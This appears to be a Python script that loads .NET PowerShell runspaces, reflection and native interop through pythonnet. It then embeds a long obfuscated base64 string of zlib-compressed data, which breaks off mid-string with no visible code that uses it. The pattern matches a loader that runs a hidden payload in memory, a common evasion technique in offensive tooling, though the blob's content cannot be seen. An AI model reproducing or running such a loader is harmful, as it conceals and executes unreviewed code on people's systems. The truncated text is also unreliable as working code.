import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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